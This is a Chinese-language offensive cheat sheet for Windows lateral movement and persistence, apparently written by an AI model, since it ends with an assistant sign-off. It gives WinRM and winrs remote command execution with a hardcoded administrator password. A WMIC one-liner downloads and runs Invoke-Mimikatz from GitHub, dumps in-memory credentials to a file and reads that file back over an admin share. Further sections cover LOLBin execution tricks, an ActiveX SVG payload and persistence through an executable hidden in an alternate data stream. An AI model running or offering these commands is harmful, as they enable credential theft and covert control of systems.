# WinRM

## 环境
- **攻击机**: Windows 2012 R2 (10.100.18.22) 安装 Python 2.7（或打包成 exe 格式以绕过杀毒软件）
- **被攻击机**: Windows 2012 R2 (10.100.18.21)

## 概述
WinRM 是 Microsoft 对 WS-Management 协议的实现，该协议是一种基于标准简单对象访问协议 (SOAP) 的“防火墙友好”协议，允许不同供应商的硬件和操作系统互相操作。简而言之，WinRM 是 Windows 中用于远程管理的一种方式，默认以服务的形式存在，工作在 5985 (HTTP) 或 5986 (HTTPS) 端口上。它通过 HTTP 协议以 SOAP 格式进行数据交换，具有较好的防火墙穿透性。

### 利用前提
- 适用于 Windows 7 及更高版本系统。
- 在 Windows 2012 及更高版本中，WinRM 服务默认自启动并允许远程主机管理。
- 需要目标机器防火墙开放 TCP 5985 或 5986 端口。
- 需要有图形界面支持和正确的管理员账号及明文密码。

### 被攻击机配置
1. **基础配置**:
   ```sh
   winrm quickconfig
   ```

2. **查看 WinRM 服务监听器**:
   ```sh
   winrm e winrm/config/listener
   ```

3. **配置 WinRM 服务认证**:
   ```sh
   winrm set winrm/config/service/auth @{Basic="true"}
   ```

4. **配置 WinRM 服务加密方式为允许非加密**:
   ```sh
   winrm set winrm/config/service @{AllowUnencrypted="true"}
   ```

5. **查看 WinRM 服务配置**:
   ```sh
   winrm get winrm/config
   ```

### 攻击手法
#### 使用 Python
```python
import winrm

session = winrm.Session('10.100.18.21', auth=('administrator', '3edc7UJM'))
result = session.run_cmd('ipconfig', ['/all'])
print(result.std_out)
```

#### 使用系统自带工具 `winrs`
```sh
winrs -r:10.100.18.21 -u:administrator -p:3edc7UJM "query user"
winrs -r:10.100.18.21 -u:administrator -p:3edc7UJM "cmd"
```

## WMIC
### 环境
- **攻击机**: Windows 2012 R2 (10.100.18.22)
- **被攻击机**: Windows 2012 R2 (10.100.18.21)

### 攻击手法
```sh
wmic /user:"administrator" /PASSWORD:"3edc7UJM" /NODE:10.100.18.21 PROCESS CALL CREATE "PowerShell -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz | Out-File C:\\Users\\Administrator\\Desktop\\wmic.txt"
```

远程读取目标主机驻留在内存的凭证：
```sh
type \\10.100.18.21\c$\Users\Administrator\Desktop\wmic.txt
```

## 其他 LOLBin 技术
### Language LUA in Files .wlua
```sh
rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
```

### Reflection.Assembly
```powershell
$RAS = Join-Path -Path c:\windows\system32\ -ChildPath calc.exe
[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
[Microsoft.VisualBasic.Interaction]::Shell("$RAS", "0")
```

### msconfig
1. 将以下代码写入 `mscfgtlc.xml` 并放置在 `C:\Windows\System32` 目录下：
   ```xml
   <PATH="%windir%\system32\WindowsPowerShell\v1.0\powershell.exe">
   <DEFAULT_OPT="-command calc.exe" HELP="LOLBin MSCONFIGTOOLS"/>
   </PATH>
   ```
2. 启动 CMD 并运行：
   ```sh
   msconfig -5
   ```

### sigverif.exe
```sh
sigverif.exe
```

### DXCap.exe
```sh
DXCap.exe -c C:\Windows\System32\notepad.exe
```

### Register-cimprovider.exe
```sh
Register-cimprovider -path "C:\folder\evil.dll"
```

### XLS Mimikatz
参考：[gist.github.com/caseysmithrc/b1190e023cd29c1910c01a164675a22e](https://gist.github.com/caseysmithrc/b1190e023cd29c1910c01a164675a22e)

### WMI (T1047)
```sh
wmic process call create "calc.exe"
wmic process where name="calc.exe" call terminate
```

### 更多 LOLBin 内容
- [gtfobins.github.io](https://gtfobins.github.io/)
- [lolbas-project.github.io](https://lolbas-project.github.io/)

# 持久化 (Persistence)
持久化技术包括任何使攻击者能够在系统重新启动、更改凭据或切断其访问权限后仍能保持对系统的访问的技术。这些技术包括替换或劫持合法代码、添加启动脚本等。

### Office - SVG (T1137)
1. 不需要 Internet Explorer 来执行 ActiveX。
2. 使用 Microsoft Office 通过 SVG Document 执行 ActiveX。
3. 仅适用于 Web 浏览器中的 Microsoft Office。

示例代码：
```html
<svg xmlns:xlink="" width="600" height="600">
  <script type="text/ecmascript">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]>
  </script>
</svg>
```

### ADS 数据流 (T1137)
```sh
echo "empty file" > c:\ADS\file.txt
makecab c:\ADS\procexp.exe c:\ADS\procexp.cab
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
wmic process call create '"c:\ADS\file.txt:procexp.exe"'
```

希望这些信息对你有所帮助！如果还有其他问题，请随时告诉我。